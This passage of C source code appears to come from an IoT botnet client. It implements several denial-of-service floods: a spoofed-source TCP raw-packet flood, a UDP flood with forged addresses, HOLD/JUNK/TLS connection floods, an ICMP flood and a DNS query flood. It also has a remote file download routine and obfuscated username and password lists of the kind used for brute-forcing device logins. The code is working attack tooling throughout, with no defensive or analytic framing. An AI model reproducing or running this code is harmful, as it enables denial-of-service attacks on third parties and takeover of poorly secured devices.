        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, HTONL( GetRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, okic("7~~")))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
  } else {
    unsigned char * pch = strtok(flags, "-");
    while (pch) {
      if (!strcmp(pch, okic("6p,"))) {
        tcph->syn = 1;
      } else if (!strcmp(pch, okic("v6c"))) {
        tcph->rst = 1;
      } else if (!strcmp(pch, okic("dx,"))) {
        tcph->fin = 1;
      } else if (!strcmp(pch, okic("7DU"))) {
        tcph->ack = 1;
      } else if (!strcmp(pch, okic("|6e"))) {
        tcph->psh = 1;
      } else {
       return;
      }
      pch = strtok(NULL, ",");
    }
  }


        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : HTONS(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = HTONL( GetRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}

int download(char *url, char *saveas) {
    int sock2, i, d;
    struct sockaddr_in serve3r;
    unsigned long ipaddr;
    char buf[1024];
    FILE * file;
    char bufm[4096];
    if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        return 3;
    }
    if (!strncmp(url, "http://", 7)) strcpy(buf, url + 7);
    else strcpy(buf, url);
    for (i = 0; i < strlen(buf) && buf[i] != '/'; i++);
    buf[i] = 0;
    serve3r.sin_family = AF_INET;
    serve3r.sin_port = HTONS(80);
	if(getHost(buf, &serve3r.sin_addr)) return -1;
    memset(&(serve3r.sin_zero), 0, 8);
    if (connect(sock2, (struct sockaddr * )&serve3r, sizeof(serve3r)) != 0) {
        return 1;
    }
    sockprintf(sock2, "GET /%s HTTP/1.1\r\n%s-%s: download\r\nHost: %s:80\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n", buf + i + 1, buf, okic("1;t="), okic("74tw!"));
    file = fopen(saveas, "wb");
    while (1) {
        int i;
        if ((i = recv(sock2, bufm, 4096, 0)) <= 0) break;
        if (i < 4096) bufm[i] = 0;
        for (d = 0; d < i; d++)
            if (!strncmp(bufm + d, "\r\n\r\n", 4)) {
                for (d += 4; d < i; d++) fputc(bufm[d], file);
                goto downloaded;
            }
    }
    downloaded:
        while (1) {
            int i, d;
            if ((i = recv(sock2, bufm, 4096, 0)) <= 0) break;
            if (i < 4096) bufm[i] = 0;
            for (d = 0; d < i; d++) fputc(bufm[d], file);
        }
    fclose(file);
    close(sock2);
    return 0;
}
 
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;
 
    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }
 
//    srand(time(NULL)); we already have it initialized in init_rand, also OVH is a bitch and they recognize random numbers generated by time
    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

void setup_ip_header(struct iphdr *iph)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 4;
        iph->id = HTONS(54321);
        iph->frag_off = 0;
        iph->ttl = 128;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
}
void setup_udp_header(struct udphdr *udph)
{
    udph->source = HTONS(50000 + rand_cmwc() % 65535);
    udph->dest = HTONS(17015);
    udph->check = 0;
    memcpy((void *)udph + sizeof(struct udphdr), "\x08\x1e\x77\xda", 4);
    udph->len=HTONS(sizeof(struct udphdr) + 4);
}
void pktLd(char *td, int port, int packet_size, int timeEnd) {
	if(listFork()) {return;}
        char datagram[65535];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
 
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = HTONS(port);
        sin.sin_addr.s_addr = inet_addr(td);
 
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
        if(s < 0){
                _exit(-1);
        }
        memset(datagram, 0, 65535);
        setup_ip_header(iph);
        setup_udp_header(udph);
 
 
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 
        
        int sport[packet_size];
        unsigned char payload1[packet_size];
        register unsigned int i;
        for(i = 0; i <= packet_size; i++){
                //print_ip(fakeclients[i]); if we debug we use this
                sport[i] = HTONS(randnum(55000,64932));
                payload1[i] = rand_cmwc();
        }
 
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
                // fprintf(stdout, "_error_: setsockopt() - Cannot set HDRINCL!\n");
                _exit(-1);
        }
                init_rand(time(NULL));
  //      register unsigned int i;
        i = 0;
 
        int packet_lenght = 0;
        
        int fake_id = 0;
        
                //This is Clay Davis
        unsigned int class[]= {42737,10345,22940,57052,18014,55888,36937,38736,39565,41428,21792,64711,10069,53253,28439,40218,21089,47421,9203,58203,32836,26238,54774,7370,36953,59722,1264,12586,24713,12259,22874,56745,3974,24962,3145,21105,53070,35456,18822,55790,8218,24114,8257,24801,54553,58466,12007,10902,11502,60633,40202,32265,52555,63753,7975,33662,50855,36477,21415,23844,64414,39456,25914,43927,53470,61265,16240,60243,42714,43138,43048,46572,41126,21434,47202,43848,2603,54700,48278,26756,22250,50039,63967,48015,11864,40937,9352,8292,58922,56112,39473,8445,25948,54356,35185,60765,18373,11934,5343,60162,30225,54089,10015,29442,9747,29664,62344,19609,14781,34120,40724,31694,2470,28547,47791,33650,34356,23874,42427,3447,60515,33376,13071,39086,47675,46427,5596,21607,8601,22230,14251,40170,17061,40354,19920,59364,9915,43306,41577,18180,53137,57784,62583,18040,34584,63047,27536,12660,55444,59358,6719,5500,25592,23527,13306,42464,15678,49583,54745,12437,16696,64590,39393,18556,4903,50906,43251,41500,35812,41855,4496,37727,60486,39015,55891,28044,56720,47345,29186,31623,10771,57038,37710,41986,56718,17108,17892,46806,52024,34831,27512,60826,62142,19878,34917,34095,14429,5182,53381,62034,14914,60229,6277,4829,18062,24180,63737,51549,26497,26161,54360,40846,31892,51432,6016,45470,50461,10636,32711,28869,31867,64063,29274,16803,9633,42439,2457,13745,4206,25692,10303,60709,3839,10092,54633,31707,29296,1779,58072,30647,50599,15982,21560,61604,31505,64248,19818,27739,61835,33817,6192,41175,16198,9032,45024,51114,61232,41300,63996,18068,59569,2582,6369,19022,35202,34460,37765,55779,22188,52195,18493,31597,36053,59129,25463,48824,40294,21846,35096,2374,58775,49677,52601,41307,15205,13208,24902,51192,14402,30017,23510,26838,41965,43005,23350,20736,25538,53699,6634,21529,13495,42696,61668,32204,45719,7343,17169,23321,10548,61579,9391,31249,48242,28142,22505,59068,31435,12863,64269,25463,41637,13365,49555,25235,54412,30773,63768,25636,14664,17122,31139,34002,51012,29896,60492,33661,27835,42584,62338,30024,9376,12520,55687,1278,16534,36564,4657,39390,35311,36438,60213,12696,1025,42097,27551,56864,47281,51601,41845,6348,64548,37950,46999,44260,60948,49590,24598,6067,44733,3842,25700,64493,50280,65131,44053,2183,38717,26863,18466,63158,19157,64149,35749,35866,19419,57631,22316,5999,12874,15750,13501,47211,40811,36714,63864,18367,20226,21694,23138,28996,25332,22059,33340,4294,19126,36743,33744,18095,33690,3180,24811,55053,16922,45333,27739,4051,6080,58680,4813,62691,64783,39656,56301,20546,34307,56048,9642,7115,25974,64079};
        
    int end = time(NULL) + timeEnd;
    register unsigned int ii = 0;
	
        while(1){
 
                iph->saddr = HTONL(class[rand_cmwc()%431]);
                udph->source = HTONS(sport[randnum(0,packet_size)]);
                
                packet_lenght = randnum(500, packet_size);
                int fake_id = rand_cmwc() & 0xFFFFFFFF;
                iph->id = HTONL(fake_id);
                
                memcpy((void *)udph + sizeof(struct udphdr), payload1, packet_lenght);
                udph->len=HTONS(sizeof(struct udphdr) + packet_lenght);
                
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + packet_lenght;
                iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 
                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));

        }
}

void pktSend(char *td, int port, int packet_size, int num_threads, int timeEnd) {

        int i;
        for(i = 0;i<num_threads;i++){
                pktLd(td, port, packet_size, timeEnd);
        }
}

//              _     _     ___ _                 _
//   /\  /\___ | | __| |   / __\ | ___   ___   __| |
//  / /_/ / _ \| |/ _` |  / _\ | |/ _ \ / _ \ / _` |
// / __  / (_) | | (_| | / /   | | (_) | (_) | (_| |
// \/ /_/ \___/|_|\__,_| \/    |_|\___/ \___/ \__,_|
/*int getdtablesize(){
    return 0x90;
}*/
void sendHLD(unsigned char *ip, int port, int end_time) {

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = HTONS(port);
    if (getHost(ip,&dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * )&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd,&myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL,&myset, NULL,&tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )(&valopt),&lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd,&myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL, NULL,&myset,&tv);
                    if (res != 0) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}

int realrand(int low, int high) {
    srand(time(NULL) ^ rand_cmwc() ^ getpid());
    return (rand() % (high + 1 - low) + low);
}

void rndBytes(unsigned char *buf, int length) {
    srand(time(NULL) ^ rand_cmwc() ^ getpid());
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (rand() % 255) + 1;
}


void rand_str(char *dest, size_t length) {
    char charset[] = "0123456789"
                     "abcdefghijklmnopqrstuvwxyz"
                     "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    while (length-- > 0) {
        size_t index = (double) rand() / RAND_MAX * (sizeof charset - 1);
        *dest++ = charset[index];
    }
    *dest = '\0';
}

void sendJNK(unsigned char * ip, int port, int end_time) {

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = HTONS(port);
    if (getHost(ip, & dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    unsigned char * pakt = malloc(1024);
    memset(pakt, 0, 1024);
    int packetLen = 1024;

    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * ) & dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO( & myset);
                    FD_SET(fds[i].fd, & myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL, & myset, NULL, & tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    //nonblocking sweg
                    packetLen = realrand(64, 1432);
                    rndBytes(pakt, packetLen);
                    if (send(fds[i].fd, pakt, packetLen, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}
void sendTLS(unsigned char * ip, int port, int end_time) { //TLS ATTACK CODED BY FREAK

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = HTONS(port);
    if (getHost(ip, & dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;


    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * ) & dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO( & myset);
                    FD_SET(fds[i].fd, & myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 20000;
                    res = select(fds[i].fd + 1, NULL, & myset, NULL, & tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    //TLS ATTACK CODED BY FREAK
					//THIS ISNT A RANDOM HEX STRING ITS THE STARTING OF A TLS HANDSHAKE
                    if (send(fds[i].fd, "\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\x03\x03\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x00\x00\x20\xcc\xa8\xcc\xa9\xc0\x2f\xc0\x30\xc0\x2b\xc0\x2c\xc0\x13\xc0\x09\xc0\x14\xc0\x0a\x00\x9c\x00\x9d\x00\x2f\x00\x35\xc0\x12\x00\x0a\x01\x00\x00\x58\x00\x00\x00\x18\x00\x16\x00\x00\x13\x65\x78\x61\x6d\x70\x6c\x65\x2e\x75\x6c\x66\x68\x65\x69\x6d\x2e\x6e\x65\x74\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\x0a\x00\x0a\x00\x08\x00\x1d\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\x0d\x00\x12\x00\x10\x04\x01\x04\x03\x05\x01\x05\x03\x06\x01\x06\x03\x02\x01\x02\x03\xff\x01\x00\x01\x00\x00\x12\x00\x00", 170, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                        //close(fds[i].fd); NEVER CLOSE SOCKET
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}


void bnrse(char *host, int secs) {
    uint8_t pkt_template[] = {
        0x03,
        0x03,
        0x0d,
        0x33,
        0x00,
        0x00,
        0x00,
        0x00,
        0x45,
        0x00,
        0x00,
        0x1c,
        0x4a,
        0x04,
        0x00,
        0x00,
        0x40,
        0x06,
        0x20,
        0xc5,
        0x01,
        0x02,
        0x03,
        0x04,
        0x05,
        0x06,
        0x07,
        0x08,
        0x00,
        0x00,
        0x00,
        0x00,
        0x00,
        0x08,
        0xef,
        0xc1
    };
    uint8_t * pkt;
    struct sockaddr_in addr;
    struct pollfd pfd;
    const size_t pkt_len = (sizeof pkt_template) / (sizeof pkt_template[0]);
    size_t i;
    int gai_err;
    int kindy;
    int x, get;

    if ((kindy = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        _exit(1);
    }
	bzero((char*) &addr,sizeof(addr));
    addr.sin_family = AF_INET;
	if(getHost(host, &addr.sin_addr)) return;
    pkt = pkt_template;
    pfd.fd = kindy;
    pfd.events = POLLOUT;
    int end = time(NULL) + secs;
    for (;;) {
        for (i = 20; i < 20 + 8 + 4; i++) {
            pkt[i] = (uint8_t) rand();
        }
        if (sendto(kindy, pkt, pkt_len, 0,(struct sockaddr *)&addr.sin_addr, sizeof(addr.sin_addr)) != (size_t) pkt_len) {

            if (errno == ENOBUFS) {
                poll(&pfd, 1, 1000);
                continue;
            }
            break;
        }
        if (i >= 100) {
            if (time(NULL) > end) {
                _exit(0);
            }
            x = 0;
        }
        x++;
    }
    /* NOTREACHED */
    close(kindy);

    return;
}

	void DNSw(unsigned char *host, int port, int secs)
	{
	int std_hex;
	std_hex = socket(AF_INET, SOCK_DGRAM, 0);
	time_t start = time(NULL);
	struct sockaddr_in sin;
	bzero((char*) &sin,sizeof(sin));
	if(getHost(host, &sin.sin_addr)) return;
	sin.sin_family = AF_INET;
	if(port == 0) { 
				sin.sin_port = realrand(49152, 65535);
	} else {
	sin.sin_port = port;
	}
	unsigned int a = 0;//made by freak
	char dnspkt[128];
    char *dnspkts[] = {
        "%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",
        "%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04\x6c\x69\x76\x65\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06\x6f\x66\x66\x69\x63\x65\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x64\x69\x67\x69\x6b\x61\x6c\x61\x03\x63\x6f\x6d\x00\x00\xff\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0a\x73\x61\x6c\x65\x73\x66\x6f\x72\x63\x65\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x05\x73\x6f\x67\x6f\x75\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07\x64\x69\x73\x63\x6f\x72\x64\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07\x77\x69\x6b\x69\x68\x6f\x77\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0e\x6d\x61\x6e\x6f\x72\x61\x6d\x61\x6f\x6e\x6c\x69\x6e\x65\x03\x63\x6f\x6d\x00\x00\xff\x00\x01",


        };//Made By Freak
    int count = NUMITEMS(dnspkts);
	while(1)
	{
       
		if (a >= 50)
		{
			if(port == 0) { 
				sin.sin_port = realrand(49152, 65535);
			}
            memset(dnspkt, 0, 128);
			sprintf(dnspkt, dnspkts[rand() % count], (char)rand() % 255, (char)rand() % 255);
			send(std_hex, dnspkt, strlen(dnspkt), 0);
			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
			if (time(NULL) >= start + secs)
			{
				close(std_hex);
				_exit(0);
			}
			a = 0;
		}
		a++;
	}
}

int j83jPid = 0;


char * usernames[] = {
	"", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\xf9\xe4\x51\x03\x39", "\xf9\xe4\x51\x03\x39", "\xf9\xe4\x51\x03\x39", "\xf9\xe4\x51\x03\x39", "\xf9\xe4\x51\x03\x39", "\xf9\xe4\x51\x03\x39", "\xf9\xe4\x51\x03\x39", "\xe7\xb9\xb9\x39", "\x90\x61\xd4\x19\xff", "\xe7\xb9\xb9\x39", "\x61\x51\x75\x90\xe4\x3c\x39", "\xe4\x03\x51\xe7", "\xf9\xe4\x51\x03\x39", "\x61\x90\x51\xd4\xb9\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\xe7\xb9\xb9\x39", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4", "\xf9\xe4\x51\x03\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\x39\x51\x3c\xff\x51\x39", "\xe7\xb9\xb9\x39", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\xa4\x61\xd4\x19\xff\x19\x03\x39\xe7\x90\x39\xb9\xe7", "\xe7\xb9\xb9\x39", "\xd4\xf9\xe2\xcf\x50\x50", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x61\x51\x75\x90\xe4\x3c\x39", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\x90\x61\xd4\x19\xff\xeb", "\xe4\xd2\xff\x39", "\x03\xe4\xa0\xa0\xb9\xe7\x39", "\xe7\xb9\xb9\x39", "\xe4\x03\x51\xe7", "\xf9\xe4\x51\x03\x39"
};

char * passwords[] = {
	"", "\xe7\xb9\xb9\x39", "\xa0\x90\x03\x03\x5a\xb9\xe7\x61", "", "\x23\x39\x51\xcf\x86\xeb", "\xfc\x19\x3e\xc1\xfc", "\x50\x50\x50\x50\x50\x50", "\xeb\x6f\xcf\x2a\x47", "\x65\x19\xe2\xcf\xeb\x9a", "\xe4\x03\x51\xe7", "\xa0\x90\x03\x03", "\x90\x61\xd4\x19\xff\xeb\x6f", "\x47\xe4\xf0\x62\x78\xb9\x50\x90\x61\xd4\x19\xff", "\x50\x50\x50\x50\x50\x50\x50\x50", "\x7f\xdb", "\x78\x3c\xfc\xeb", "\x78\x3c\xfc\xeb\x6f", "\xb9\x51\x3c\x19\xff\xe4\xc1\xeb", "\xe7\x51\x90\x3c\x39\x51\x78", "\xeb\xeb\xeb\xeb", "\xcf\x6f\xe2\x86\xeb", "\x90\xff\x39\x03\x3c\xcb", "\x3e\x39\x51\xd0\xc1\xeb\xcf", "\x03\x22\x03\x39\x51\xd4", "\xeb\x6f\xcf\x2a", "\x9a\x9a\x9a\x9a\x9a\x9a", "\x19\x78\x5a\xd2", "\x61\x51\x75\x90\xe4\x3c\x39", "\xf0\xe4\x90\xff\x39\x51\xce\x65", "\xc1\xce\xe2\xcf\xeb\xeb", "\x03\xe4\xa0\xa0\xb9\xe7\x39", "\xeb\xeb\xeb\xeb\xeb\xeb\xeb", "\x03\x51\xe7\xfc\x19\xce\x51", "\xeb\x6f\xcf", "\x6f\xe2\x86\xeb", "\x39\x51\xce\x65", "\x7f\xdb", "\x90\xd2\xce\xeb", "\x47\xe4\xf0\x62\x78\xb9\x50\x90\x61\xd4\x19\xff", "\x03\x5a\x19\x39\xce\x65", "\x90\x61\xd4\x19\xff\xeb\x6f", "", "\xeb\xeb\xeb\xeb", "\xd4\x51\x19\xff\x03\xd4", "\xa0\x90\x03\x03", "\x03\xd4\xce\x90\x61\xd4\x19\xff", "\xeb\x6f\xcf\x2a\x47\x9a\xd0\x50", "\xeb\x6f", "\x90\x61\xd4\x19\xff\xeb", "\xa0\x90\x03\x03\x5a\xb9\xe7\x61", "\x90\x61\xd4\x19\xff", "\x90\xff\x78\xb9", "\xc1\xce\xe2\xcf\xeb\xeb", "\xeb\x6f\xcf\x2a", "", "\xf9\xe4\x51\x03\x39", "\xeb\x6f\xcf", "\xc1\xce\xe2\xcf\xeb\xeb", "\x90\x61\xd4\x19\xff", "\x23\x39\x51\xcf\x86\xeb", "", "\xe4\x03\x51\xe7", "\xf9\xe4\x51\x03\x39", "", "\xa0\x90\x03\x03\x5a\xb9\xe7\x61", "\x90\x61\xd4\x19\xff\xeb", "\x19\x78\x5a\xd2", "\xeb\x6f\xcf\x2a\x47\x9a\xd0\x50", "", "", "\xeb\x6f\xcf\x2a", "\xe7\xb9\xb9\x39", "\x39\x51\x3c\xff\x51\x39", "\x3e\x39\x51\xd0\xc1\xeb\xcf", "\xd4\x51\x19\xff\x03\xd4", "", "", "\x90\xff\x39\x03\x3c\xcb", "\xd4\x51\xe7\x3c\x19\xff", "\x03\x5a\x19\x39\xce\x65", "\x47\xe4\xf0\x62\x78\xb9\x50\x90\x61\xd4\x19\xff", "\x90\xd2\xce\xeb", "\x7f\xdb", "\x39\x51\xce\x65", "\x6f\xe2\x86\xeb", "\x61\x51\x75\x90\xe4\x3c\x39", "\xeb\x6f\xcf", "\x03\x51\xe7\xfc\x19\xce\x51", "\xeb\xeb\xeb\xeb\xeb\xeb\xeb", "\x90\x61\xd4\x19\xff\xeb\x6f", "\xa0\x90\x03\x03", "\xe4\x03\x51\xe7", "\x65\x19\xe2\xcf\xeb\x9a", "\xa0\x90\x03\x03\x5a\xb9\xe7\x61", "\xe4\xd2\xff\x39", "\x3e\x3c\xc1\xc1\x97", "\xeb\x6f\xcf\x2a\x47", "\x50\x50\x50\x50\x50\x50"
};


char * advances[] = {
	"\xf1", "\x03\x51\xe7", "\xb9\xf9\x19\xff", "\xff\x90\xd4\x51", "\xa0\x90\x03\x03", "\x61\xfc\xe7\x61\xfc\x03"
};
char * fails[] = {
